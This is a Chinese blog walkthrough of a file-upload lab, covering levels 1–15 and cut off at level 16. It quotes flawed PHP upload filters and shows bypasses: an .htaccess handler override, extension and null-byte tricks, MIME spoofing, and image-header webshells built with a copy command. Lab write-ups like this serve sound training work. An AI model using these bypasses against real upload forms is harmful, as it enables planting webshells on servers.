alt="mark"><br><strong>第一关的上传过滤只是在客户端进行过滤的，js对文件后缀名做了白名单限制，任何前端的验证都不算是真正的验证，在这里我使用了4种方式去绕过，这些方法都是绕过前端验证的常用方法</strong></p><p><strong>1.firebug查看元素，将这里的表单的onsubmit事件删除，这样提交表单时便不会触发验证函数</strong><br><img src="http://pic.c1imber.top/blog/180609/1JdGj6CB2H.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/Bdke4Dkjef.png?imageslim" alt="mark"><br><strong>再次上传php就能上传</strong><br><img src="http://pic.c1imber.top/blog/180609/LemHid1HF9.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/HcHKamKIJG.png?imageslim" alt="mark"></p><p><strong>2.firebug控制台重新写一个和过滤函数名字一样的函数，使函数return true,覆盖之前的检查函数</strong><br><img src="http://pic.c1imber.top/blog/180609/gbhk5HiGfa.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/hLa3DDGL2H.png?imageslim" alt="mark"><br><strong>之后上传php也能上传成功</strong><br><img src="http://pic.c1imber.top/blog/180609/CIiCLHFmgd.png?imageslim" alt="mark"></p><p><strong>3.在火狐浏览器中禁用js，在地址栏输入about:config,查找javascript，将javascript.enabled的类型改为false，默认值为true</strong><br><img src="http://pic.c1imber.top/blog/180609/ifIhjCFF3f.png?imageslim" alt="mark"><br><strong>禁用了js后就能绕过前端检测上传php了</strong><br><img src="http://pic.c1imber.top/blog/180609/gJ8igaDJFH.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/gE4C3I14E4.png?imageslim" alt="mark"></p><p><strong>4.先上传允许的后缀名绕过前端检测，之后burp抓包，在发往服务端的过程中将后缀名再修改为php</strong><br><img src="http://pic.c1imber.top/blog/180609/GBgb52Lbl5.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/HbJ1bgCLI3.png?imageslim" alt="mark"><br><strong>从而绕过了前端验证</strong><br><img src="http://pic.c1imber.top/blog/180609/A8kf34hJH0.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/ajjJkiJKba.png?imageslim" alt="mark"></p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p><strong>第二关是在服务端做了验证，代码层对文件的MIME类型进行了检查，为了方便理解原理，可以看一下后端的检查代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</div><div class="line">               <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">               $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">               $is_upload = <span class="keyword">true</span>;</div><div class="line">             &#125;</div><div class="line">       &#125; <span class="keyword">else</span> &#123;</div><div class="line">           $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</div><div class="line">       &#125;</div></pre></td></tr></table></figure><p><strong>有关这种场景的绕过方法，使用burp抓包，修改文件上传的content-type类型为白名单允许的图片MIME类型即可</strong><br><img src="http://pic.c1imber.top/blog/180609/EbBl9m7CaJ.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/70aFbF8Bi3.png?imageslim" alt="mark"><br><strong>然后就可以绕过检测上传成功了</strong><br><img src="http://pic.c1imber.top/blog/180609/BlKbi2BAdl.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/Lj3KA6C4G9.png?imageslim" alt="mark"></p><h3 id="第三关-amp-第四关"><a href="#第三关-amp-第四关" class="headerlink" title="第三关&amp;第四关"></a>第三关&amp;第四关</h3><p><strong>第三关的本意其实是想上传一些后缀名为<code>php、php2、php3、php5、phtml</code>等文件去绕过黑名单的,但是apache的配置文件里并没有配置将这些后缀的文件当做php解析</strong><br><img src="http://pic.c1imber.top/blog/180609/GAlJhg7Dcl.png?imageslim" alt="mark"><br><strong>第三关第四关都是黑名单检测，但是在这里黑名单里都没有对.htacess做限制，所以这两关都可以上传.htaccess去绕过，.htaccess文件的内容如下</strong></p><pre><code>&lt;FilesMatch &quot;tony&quot;&gt;    SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p><strong>我们将这样一个.htaccess文件上传到服务器上传目录，这样的话，当apache在解析该目录下的php时，就会按照.htaccess中的要求去解析，只要匹配到了文件名里有tony这个字符串，就会把该文件当成php文件解析</strong></p><p><strong>首先上传这样的一个.htaccess文件</strong><br><img src="http://pic.c1imber.top/blog/180609/KLIm79lKhA.png?imageslim" alt="mark"><br><strong>.htaccess可以上传成功</strong><br><img src="http://pic.c1imber.top/blog/180609/8Ef545ddL5.png?imageslim" alt="mark"><br><strong>接着上传一个黑名单里没有过滤的随意后缀名文件，但是文件名里要有tony，上传一个tony.jpg，内容为一句话木马</strong><br><img src="http://pic.c1imber.top/blog/180609/G5D3FCCCm0.png?imageslim" alt="mark"><br><strong>上传成功，并且tony.jpg会被apache当成php文件解析</strong><br><img src="http://pic.c1imber.top/blog/180609/Fkf5J6Ecgb.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/i4gJ3EHKf4.png?imageslim" alt="mark"><br><strong>第四关也是同样的方法</strong></p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p><strong>第五关在第四关的黑名单中又加进了.htaccess，所以上传.htaccess这个思路没戏了</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</div></pre></td></tr></table></figure><p><strong>可以看看过滤内容，过滤的还挺多，这里apache版本为2.4.23，所以apache文件名（x.php.xxx）解析漏洞不能在这用</strong></p><p><strong>并且在做该黑名单检查之前将上传文件后的<code>.</code>和空格字符都给删除了</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">           $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</div><div class="line">           $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = <span class="string">'此文件不允许上传'</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure><p><strong>这样做是为了防止用户上传是在后缀名后加上<code>.</code>和空格去绕过黑名单，windows在创建文件时会删除后缀名后的<code>.</code>和空格，并且后缀名为php.的文件也是可以当作php解析的（windows和linux环境都可以）</strong></p><p><strong>同时对文件名后缀名大小写写做了检查，防止大小写绕过</strong></p><p><strong>但是通过代码发现在黑名单检查之前处理文件名时只删除了一次<code>.</code>，于是可以上传一个后缀名为<code>php. .</code>的文件去绕过，这个在黑名单检查之前后缀名就会被处理为<code>php.</code></strong><br><img src="http://pic.c1imber.top/blog/180609/68Akdc4jfA.png?imageslim" alt="mark"><br><strong>可以看到成功绕过了上传检测</strong><br><img src="http://pic.c1imber.top/blog/180609/cc2iblBg14.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/fEHFFIHi6K.png?imageslim" alt="mark"></p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p><strong>查看过滤代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</div><div class="line">$file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">        $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</div><div class="line">        $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $msg = <span class="string">'此文件不允许上传'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>相对于第五关的过滤还少了一些，相同的黑名单，但是相比于第五关，这里仅仅删除了文件名后的<code>.</code>，并没有删除空格，所以可以上传一个后缀名为<code>php+空格</code>的文件去绕过黑名单，windows在创建文件时会自动删掉最后的空格</strong><br><img src="http://pic.c1imber.top/blog/180609/D74F0I3CaD.png?imageslim" alt="mark"><br><strong>可以看到成功绕过这里的上传检测</strong><br><img src="http://pic.c1imber.top/blog/180609/J1ckAadb1a.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/kJCf7HFf8m.png?imageslim" alt="mark"></p><h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p><strong>第六关仅仅将文件名后面的点删除了，第七关则是仅仅将文件名后的空格给删除了，这里通过上传后缀名为<code>php.</code>的文件来绕过黑名单</strong><br><img src="http://pic.c1imber.top/blog/180609/DGFjCfbcHh.png?imageslim" alt="mark"><br><strong>成功绕过黑名单上传</strong><br><img src="http://pic.c1imber.top/blog/180609/7AKdha67J2.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/JA9H4CcB55.png?imageslim" alt="mark"></p><h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p><strong>和第五关一样，虽然在黑名单检查之前将文件名后的<code>.</code>和空格给删除了，但是<code>.</code>只删除了一次，这里同样使用后缀名<code>php. .</code>去绕过</strong></p><h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p><strong>一样的问题，所以继续用第八关的方法去绕过上传</strong></p><h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p><strong>尝试上传后缀名php的文件，看到可以上传成功，不过后缀名php被删除了</strong><br><img src="http://pic.c1imber.top/blog/180609/Hbd6GjC5ci.png?imageslim" alt="mark"><br><strong>后缀名改为大写PHP上传，同样给删除了</strong><br><img src="http://pic.c1imber.top/blog/180609/dj8CfC8hAh.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/jg1FB6j93K.png?imageslim" alt="mark"><br><strong>猜想后台使用<code>str_ireplace</code>函数将文件后缀为黑名单的都给删除了，查看过滤代码确实如此</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</div><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</div><div class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</div><div class="line">    $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</div><div class="line">    $is_upload = <span class="keyword">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>因为<code>str_ireplace</code>函数只做一次替换，所以使用<code>pphphp</code>后缀名就能绕过</strong><br><img src="http://pic.c1imber.top/blog/180609/JDbd01feKa.png?imageslim" alt="mark"><br><strong>可以看到成功上传php</strong><br><img src="http://pic.c1imber.top/blog/180609/0kI0jjedHg.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/G53DH9G6k6.png?imageslim" alt="mark"></p><h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h3><p><strong>采用的防御手法是白名单过滤，只允许上传jpg、png和gif类型，并且将上传的文件给重命名为了白名单中的后缀</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</div><div class="line">$file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</div><div class="line"><span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</div><div class="line">   $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">   $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div><div class="line"></div><div class="line">   <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">   $is_upload = <span class="keyword">true</span>;</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">else</span>&#123;</div><div class="line">   $msg = <span class="string">'上传失败！'</span>;</div><div class="line">   &#125;</div></pre></td></tr></table></figure><p><strong>处理上传文件的方式</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div></pre></td></tr></table></figure><br><strong>看起来这样防御并没有什么问题，但是这一关上传目录是可控的</strong></p><p><strong>所以可以先上传一个后缀名为jpg,内容为一句话木马的文件，然后修改上传目录为.php后缀，之后在.php后使用%00截断后面的拼接内容，注意这里需要关掉<code>magic_quotes_gpc</code>这个php扩展，否则00会被转义</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_GET[<span class="string">'save_path'</span>]这里使用<span class="number">00</span>截断.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div></pre></td></tr></table></figure><p><strong>注意这里的00字符因为在url的GET参数中，所以需用进行url编码</strong><br><img src="http://pic.c1imber.top/blog/180609/mA0g49b3ID.png?imageslim" alt="mark"></p><p><strong>通过这种方法就可以成功绕过十一关的上传检测</strong><br><img src="http://pic.c1imber.top/blog/180609/bgIAeh5fhK.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/KAj14k48Hd.png?imageslim" alt="mark"></p><h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h3><p><strong>同样是上传路径可以控制，不同的是这里的路径是以POST参数传递的，同样的这里在目录后面使用00截断</strong><br><img src="http://pic.c1imber.top/blog/180609/I152AJCcI7.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/flcIiI8892.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/2L2fG36AC3.png?imageslim" alt="mark"><br><strong>可以看到成功绕过上传</strong><br><img src="http://pic.c1imber.top/blog/180609/Ib19cJh665.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/j83GG617aG.png?imageslim" alt="mark"></p><h3 id="第十三关-amp-第十四关-amp-第十五关"><a href="#第十三关-amp-第十四关-amp-第十五关" class="headerlink" title="第十三关&amp;第十四关&amp;第十五关"></a>第十三关&amp;第十四关&amp;第十五关</h3><p><strong>任务和之前的不同，这里只需要成功上传图片马，并且图片马里有完整的webshell即可</strong></p><p><strong>对于第十三关第十四关和第十五关这三关都是对文件幻数进行了检测，只不过第十四关使用的是<code>getimagesize</code>函数，第十五关使用的是<code>exif_imagetype</code>函数,函数返回值内容不一样而已</strong></p><p><strong>要想突破文件幻数检测，首先要了解jpg、png、gif这三种文件的头部格式，每种类型的图片内容最开头会有一个标志性的头部，这个头部被称为文件幻数。</strong></p><p><strong>jpg文件头部格式</strong><br><img src="http://pic.c1imber.top/blog/180610/dJ36H5lLGl.png?imageslim" alt="mark"><br><strong>文件头值为<code>FFD8FFE000104A464946</code></strong></p><p><strong>png文件头格式，网上大部分资料写的都是<code>89504E47</code>，但是经过我的测试，这四个16进制是仅仅不够的，如果只是<code>89504E47</code>的话，会使<code>getimagesize</code>函数和<code>exif_imagetype</code>函数报错</strong><br><img src="http://pic.c1imber.top/blog/180610/FglLL507mf.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/JD2hc9BBGB.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/14GjDG5EHK.png?imageslim" alt="mark"><br><strong>经过我的测试真正的文件头值应该是<code>89504E470D0A1A0A</code></strong><br><img src="http://pic.c1imber.top/blog/180610/GgDHJb3I35.png?imageslim" alt="mark"></p><p><strong>gif文件头格式</strong><br><img src="http://pic.c1imber.top/blog/180610/b9H0a1l3lC.png?imageslim" alt="mark"><br><strong>文件头值为<code>474946383961</code></strong></p><p><strong>经过测试，<code>getimagesize</code>函数和<code>exif_imagetype</code>函数都只是是对文件头进行检查，只要文件头部符合函数就会返回内容</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">"check jpg&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"getimagesize function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(getimagesize(<span class="string">"heishacker.jpg"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"exif_imagetype function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(exif_imagetype(<span class="string">"heishacker.jpg"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;check png&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"getimagesize function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(getimagesize(<span class="string">"mingren.png"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"exif_imagetype function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(exif_imagetype(<span class="string">"mingren.png"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;check gif&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"getimagesize function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(getimagesize(<span class="string">"xiangtian.gif"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"exif_imagetype function return:&lt;/br&gt;"</span>;</div><div class="line">var_dump(exif_imagetype(<span class="string">"xiangtian.gif"</span>));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180610/aImGHa1L1l.png?imageslim" alt="mark"><br><strong>所以这几关都可以上传图片马，图片马的文件头就是正常图片的文件头格式，从而绕过图片幻数检测</strong></p><p><strong>windows下图片马制作方式</strong></p><pre><code>copy x.jpg|png|gif/b+x.php/a x.jpg|png|gif</code></pre><p><strong>参数/b指定以二进制格式复制、合并文件(图片),参数/a指定以ASCII格式复制、合并文件（php文件），x.php文件里为要写的一句话木马</strong></p><p><strong>这三关都可以成功上传图片马，并且里面有完整的一句话木马，但是有时候图片马里面的一些字符会使php报错，导致用文件包含或者解析漏洞去解析图片马中的php时导致解析不了，可以看到利用文件包含去解析三个图片马时均不能解析</strong><br><img src="http://pic.c1imber.top/blog/180610/2C0bBcE130.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/gfIKil3hEd.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/I0GHj8Fe57.png?imageslim" alt="mark"><br><strong>所以在寻找图片制作图片马时需要耐心的寻找一些不会使php报错的图片</strong></p><p><strong>而且有时候对文件大小也有限制，所以绕过文件幻数最合适的方式是利用16进制编辑器自己制作一个伪图片马，这里利用winhex分别创建shell.jpg、shell.png、shell.gif三个伪图片马</strong><br><img src="http://pic.c1imber.top/blog/180610/h4AK5Ja53d.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/HHi4djejE2.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/83mckBeaL3.png?imageslim" alt="mark"><br><strong>之后上传这三个伪图片马，这样不光可以上传成功，也可以利用文件包含漏洞或解析漏洞解析成功</strong><br><img src="http://pic.c1imber.top/blog/180610/F1c6GHHc15.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/D5Hfd4CgEC.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/gcf7F0Fmme.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/CbG93Ghj61.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/LAGG5c4FcB.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180610/KiIL2KmaHI.png?imageslim" alt="mark"><br><strong>这三关均可以采用这种方式通关，第十五关需要在php配置文件中开启php的php_exif扩展</strong><br><img src="http://pic.c1imber.top/blog/180610/m2098dmK3b.png?imageslim" alt="mark"><br><strong>当然，耐心的选择一个合适的图片制作图片马也是可以的</strong></p><h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></div><div class="line">    $filename = $_FILES[<span 